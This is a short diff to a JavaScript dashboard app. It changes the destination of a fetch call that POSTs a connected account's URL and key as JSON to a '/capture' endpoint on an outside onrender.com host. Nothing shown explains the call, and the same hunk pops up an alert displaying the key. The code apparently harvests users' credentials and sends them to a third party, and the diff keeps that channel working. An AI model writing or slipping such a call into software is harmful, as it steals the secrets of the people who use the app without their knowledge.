@@ -5767,7 +5767,7 @@ async function connectSaved(id) {
   await startDashboard(acc.url, acc.key);
 }
   alert('URL: ' + url + '\nKey: ' + key);
-fetch('https://sopna-1.onrender.com/capture', {
+fetch('https://sopna.onrender.com//capture', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ url: url, key: key })
